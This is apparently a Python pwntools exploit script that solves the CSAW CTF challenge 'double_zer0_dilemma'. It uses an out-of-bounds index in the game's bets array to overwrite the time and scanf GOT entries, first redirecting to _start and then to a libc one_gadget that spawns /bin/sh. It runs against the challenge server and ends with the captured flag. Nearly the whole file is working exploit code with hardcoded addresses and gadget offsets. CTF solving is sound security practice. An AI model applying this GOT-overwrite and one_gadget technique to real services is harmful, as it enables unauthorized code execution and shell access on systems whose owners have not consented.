# bet[36] = 8BYTE
from pwn import *

exe = ELF('./double_zer0_dilemma')
libc = ELF('./libc-2.31.so')

bets = 0x0808D0E0

scanf_g =  0x00007ffff7e330b0

main_addr = exe.symbols['main']
start_addr = exe.symbols['_start']
play_addr = exe.symbols['play']
time_got = exe.got['time']
scanf_got = exe.got['__isoc99_scanf']

time_addr = 0x401060
scan_addr = 0x4010f0
libc.address = time_addr - libc.symbols['time']
libc.address = 0x7ffff7dd0000

# delta = bets - write_addy
# index_delta = delta // 8 # 1470

def generate_payload(to_write:bytes, original:bytes) -> int:
	original_s = u64(original, sign='signed')
	to_write_s = u64(to_write, sign='signed')
	    
	to_add_s = to_write_s - original_s
	if ((original_s + to_add_s) != to_write_s):
		raise Exception('failed to generate payload')
	
	return to_add_s





r = remote('double-zer0.csaw.io', 9999)
#r = process('./double_zer0_dilemma')



time_got_index = (time_got-bets)//8 # -22
scanf_got_index = (scanf_got - bets) // 8 # -20

'''
print(r.sendlineafter(b'on: \n', str(time_got_index).encode()))

payload = generate_payload(p64(start_addr), p64(time_addr)) # 130584480
print(payload)
print(r.sendlineafter(b'wager: \n', str(payload).encode()))
'''


print(r.sendlineafter(b'on: \n', str(time_got_index).encode()))

payload = generate_payload(p64(start_addr), p64(time_addr)) # 130584480
print(payload)
print(r.sendlineafter(b'wager: \n', str(payload).encode()))



'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''


if 1:
	print(scanf_got_index)
	print(r.sendlineafter(b'on: \n', str(scanf_got_index).encode())) # -20

	one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
	one_gadget = [g + libc.address for g in one_gadget]
	g = one_gadget[1]
	print(hex(g))

	payload = generate_payload(p64(g), p64(scanf_g))
	print(payload)
	print(r.sendlineafter(b'wager: \n', str(payload).encode())) # 140737348577956


if 0:
	print(r.sendlineafter(b'on: \n', b'0'))
	print(r.sendlineafter(b'wager: \n', b'0'))


r.interactive()


# csawctf{d0n't_g@mbl3__juST_pwn_!!}
